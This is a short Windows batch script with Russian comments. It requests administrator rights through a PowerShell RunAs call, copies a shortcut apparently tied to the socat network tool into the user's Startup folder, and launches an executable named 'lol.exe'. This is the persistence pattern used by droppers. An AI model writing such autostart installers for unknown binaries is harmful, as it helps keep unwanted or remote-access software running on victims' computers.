@echo off
net session >nul 2>&1
if %errorlevel% neq 0 (
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

@echo off
:: Включаем поддержку русского языка в консоли
chcp 65001 > nul

:: Жестко принуждаем скрипт работать в папке, где он сам находится
cd /d "%~dp0"

:: --- НАСТРОЙКА ИМЕН ФАЙЛОВ (Укажите свои точные имена файлов) ---
set "Shortcut=0socatYou_arl.lnk"
set "ProgramToRun=lol.exe"
:: -------------------------------------------------------------

:: 100% рабочий и защищенный путь к автозагрузке в кавычках
set "StartupFolder=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

echo Проверка файлов в папке: "%CD%"
echo.

echo [1/2] Копирование ярлыка...
if exist "%Shortcut%" (
    :: Кавычки вокруг путей обязательны, чтобы пробелы не ломали команду
    copy /Y "%Shortcut%" "%StartupFolder%\" > nul
    echo [УСПЕХ] Ярлык "%Shortcut%" скопирован в автозагрузку.
) else (
    echo [ОШИБКА] Файл "%Shortcut%" НЕ НАЙДЕН рядом со скриптом!
)

echo.
echo [2/2] Запуск программы...
if exist "%ProgramToRun%" (
    start "" "%ProgramToRun%"
    echo [УСПЕХ] Программа "%ProgramToRun%" запущена.
) else (
    echo [ОШИБКА] Файл "%ProgramToRun%" НЕ НАЙДЕН рядом со скриптом!
)

echo.
echo Для выхода нажмите любую кнопку...
pause > nul
